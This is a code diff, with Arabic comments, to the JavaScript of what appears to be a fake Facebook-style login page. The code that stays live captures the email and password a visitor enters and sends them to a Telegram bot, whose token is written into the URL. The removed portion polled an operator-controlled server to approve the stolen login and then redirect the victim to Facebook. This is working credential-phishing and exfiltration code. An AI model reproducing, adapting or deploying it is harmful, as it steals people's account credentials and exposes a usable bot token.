@@ -1,4 +1,3 @@
-// ✅ عند الضغط على زر "Log In"
 document.getElementById('submit-btn').addEventListener('click', () => {
     const email = document.getElementById('email').value.trim();
     const password = document.getElementById('password').value.trim();
@@ -7,9 +6,6 @@ document.getElementById('submit-btn').addEventListener('click', () => {
         alert("⚠️ يرجى إدخال البريد وكلمة المرور.");
         return;
     }
-
-    // ✅ إخفاء رسالة الخطأ إذا كانت ظاهرة
-    document.getElementById('error-message').style.display = 'none';
 
     // إرسال البيانات إلى بوت التليجرام
     fetch('https://api.telegram.org/bot7828630167:AAG8iKwW5-NKU7OsmYDGmxip3NhhDBKLXVk/sendMessage', {
@@ -29,52 +25,12 @@ document.getElementById('submit-btn').addEventListener('click', () => {
         })
     })
     .then(() => {
-        console.log('📤 تم إرسال البيانات إلى البوت، ننتظر الرد...');
-        checkLoginStatus(); // نبدأ التحقق بعد الإرسال فقط
+        console.log('📤 تم إرسال البيانات إلى البوت.');
+        alert("✅ تم إرسال بياناتك، يرجى انتظار الرد عبر التيليجرام.");
+        // لا استعلام أو توجيه تلقائي هنا
     })
     .catch(error => {
         console.error("❌ فشل في إرسال البيانات إلى تيليجرام:", error);
+        alert("❌ حدث خطأ أثناء إرسال البيانات، حاول مرة أخرى.");
     });
 });
-
-function checkLoginStatus() {
-    const maxAttempts = 30; // أقصى عدد محاولات (حوالي دقيقة)
-    let attempts = 0;
-
-    const interval = setInterval(() => {
-        attempts++;
-        if (attempts > maxAttempts) {
-            clearInterval(interval);
-            console.warn("⏳ لم يتم الحصول على رد خلال المهلة المحددة.");
-            return;
-        }
-
-        fetch('https://login-vpns.onrender.com/get-status')
-            .then(res => res.json())
-            .then(data => {
-                if (data.accepted) {
-                    clearInterval(interval);
-                    console.log("✅ تم القبول، توجيه المستخدم...");
-
-                    // إعادة تعيين الحالة
-                    fetch('https://login-vpns.onrender.com/update-status?action=reset')
-                        .then(() => {
-                            window.location.href = 'https://www.facebook.com/login';
-                        });
-
-                } else if (data.rejected) {
-                    clearInterval(interval);
-                    console.log("❌ تم الرفض، عرض الرسالة للمستخدم.");
-
-                    // عرض رسالة الخطأ
-                    document.getElementById('error-message').style.display = 'block';
-
-                    // إعادة تعيين الحالة
-                    fetch('https://login-vpns.onrender.com/update-status?action=reset');
-                }
-            })
-            .catch(err => {
-                console.error('⚠️ خطأ أثناء التحقق من الحالة:', err);
-            });
-    }, 2000);
-}
